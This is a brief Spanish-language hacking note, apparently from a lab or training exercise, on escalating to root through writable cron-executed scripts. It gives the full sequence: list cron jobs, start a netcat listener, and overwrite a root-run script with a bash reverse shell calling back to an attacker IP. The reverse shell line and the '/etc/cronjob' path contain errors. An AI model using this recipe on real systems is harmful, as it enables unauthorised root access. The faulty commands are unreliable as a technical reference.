# CronJon vuln

## Vector de ataque

En esencia el vector de ataque es el siguiente:

1. Listar cronjobs
2. Revisar archivos ejecutables por root que sean manipulables
3. Inyectar shell reversa

## Listar cronjobs
Podemos revisar los cronjobs que se encuentren disponibles

```
cat /etc/cronjob
```

## Revisar

Esto arrojará una cantidad X de resultados con archivos ejecutados por usuarios (con suerte root) y comandos y/o scripts (con suerte manipulables)

Existe una probabilidad de que se haya eliminado el archivo pero no de los jobs, por lo que se pueden crear.

## Inyectar 
### maquina atacante (supongamos ip 10.11.1.33)

Se levanta una escucha activa con netcat

 ```
 nc -nvlp 6666 
 ```

 ### maquina victima
 Se reemplaza el contenido del script vulnerable por una shell reversa en bash (**verificar que tenga permisos de ejecución**)

 ```
 #!/bin/bash
 bash -i &< /dev/tcp/10.11.1.33/6666 0>&1
 ```

Esto permitirá que se ejecute la shell reversa con permisos de root

Eso permitirá escalar a root desde la maquina atacante

---
Happy exploiting - Zpx